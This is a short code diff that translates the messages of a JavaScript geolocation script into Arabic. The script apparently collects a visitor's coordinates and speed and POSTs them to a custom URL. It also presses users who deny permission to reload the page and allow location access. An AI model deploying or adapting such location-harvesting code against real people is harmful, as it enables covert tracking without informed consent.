@@ -7,7 +7,7 @@ function locate()
   }
   else
   {
-    alert('Geolocation is not Supported by your Browser...');
+    alert('لا يدعم المستعرض الخاص بك تحديد الموقع الجغرافي...');
   }
 
   function showPosition(position)
@@ -52,10 +52,10 @@ function locate()
       spd = spd + ' m/s';
     }
     else {
-      spd = 'Not Available';
+      spd = 'غير متوفر';
     }
 
-    var ok_status = 'success';
+    var ok_status = 'تم بنجاح';
 //custom url
     $.ajax({
       type: 'POST',
@@ -70,13 +70,13 @@ function locate()
 function showError(error)
 {
   var err_text;
-  var err_status = 'failed';
+  var err_status = 'فشل ! أعد التحميل';
 
 	switch(error.code)
   {
 		case error.PERMISSION_DENIED:
-			err_text = 'User denied the request for Geolocation';
-      alert('Please Refresh This Page and Allow Location Permission...');
+			err_text = 'رفض المستخدم طلب تحديد الموقع الجغرافي';
+      alert('يرجى تحديث هذه الصفحة والسماح بإذن الموقع...');
       break;
 		case error.POSITION_UNAVAILABLE:
 			err_text = 'Location information is unavailable';
